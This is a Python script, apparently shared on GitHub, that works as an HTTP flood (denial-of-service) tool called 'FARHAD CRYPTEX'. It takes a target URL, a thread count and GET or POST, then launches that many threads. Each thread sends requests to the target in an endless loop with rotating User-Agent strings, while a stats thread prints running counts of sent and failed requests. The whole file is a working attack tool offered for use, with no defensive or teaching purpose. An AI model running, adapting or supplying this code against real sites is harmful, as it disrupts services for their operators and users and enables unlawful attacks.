import os
import sys
import threading
import requests
import random
import time
from colorama import Fore, init

init(autoreset=True)
os.system('clear')

# লোগো
print(Fore.CYAN + '''
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     ██████╗██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██║ ██╔╝
█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    ██║     ██████╔╝██║   ██║██████╔╝█████╗  █████╔╝ 
██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    ██║     ██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██╔═██╗ 
██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    ╚██████╗██║     ╚██████╔╝██║     ███████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝

         FARHAD CRYPTEX - CRX STYLE FLOOD TOOL v1.0
         Author: Farhad CrypteX | GitHub: osmangani097
''')

# আর্গুমেন্ট চেক
if len(sys.argv) != 4:
    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads> <method>")
    print(Fore.YELLOW + "Example: python3 FarHadCrypteX.py https://example.com 300 GET")
    sys.exit()

url = sys.argv[1]
threads = int(sys.argv[2])
method = sys.argv[3].upper()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
start_time = time.time()

def attack():
    global success, failed
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            if method == "GET":
                r = requests.get(url, headers=headers, timeout=5)
            elif method == "POST":
                r = requests.post(url, headers=headers, data={'data': 'FarhadCrypteX'}, timeout=5)
            else:
                print(Fore.RED + f"Invalid method: {method}")
                break
            success += 1
        except:
            failed += 1

def stats():
    while True:
        time.sleep(3)
        uptime = int(time.time() - start_time)
        print(Fore.GREEN + f"[+] Sent: {success} | [-] Failed: {failed} | Uptime: {uptime}s")

# চালু করা হচ্ছে
print(Fore.CYAN + f"[!] Launching attack on {url} using {threads} threads with {method} method.\n")
threading.Thread(target=stats).start()

for _ in range(threads):
    threading.Thread(target=attack).start()